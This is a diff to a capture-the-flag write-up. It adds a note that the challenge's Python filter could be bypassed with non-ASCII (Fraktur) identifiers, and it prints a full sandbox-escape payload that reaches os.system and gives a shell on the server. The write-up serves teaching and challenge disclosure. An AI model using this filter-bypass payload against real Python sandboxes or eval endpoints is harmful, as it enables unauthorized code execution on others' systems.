@@ -180,6 +180,12 @@ The code is almost the same. The only difference in the usage of the `round_with
 
 Well done ! Maybe next time you'll get to reverse some python assembly code ;).
 
+
+NB: There was an alternante way to flag. I forgot to check for non-ascii filter bypass ;). Something like this allowed to get a shell on the server and juste print the source code.
+```
+[*().__𝔠𝔩𝔞𝔰𝔰__.__𝔟𝔞𝔰𝔢__.__𝔰𝔲𝔟𝔠𝔩𝔞𝔰𝔰𝔢𝔰__()[81].__𝔦𝔫𝔦𝔱__.__𝔤𝔩𝔬𝔟𝔞𝔩𝔰__.𝔳𝔞𝔩𝔲𝔢𝔰()][54].𝔪𝔬𝔡𝔲𝔩𝔢𝔰[().__𝔡𝔬𝔠__[34]+().__𝔡𝔬𝔠__[19]].𝔰𝔶𝔰𝔱𝔢𝔪([].__𝔡𝔬𝔠__[17]+[].__𝔡𝔬𝔠__[54])
+```
+
 ### Flag
 
 ```
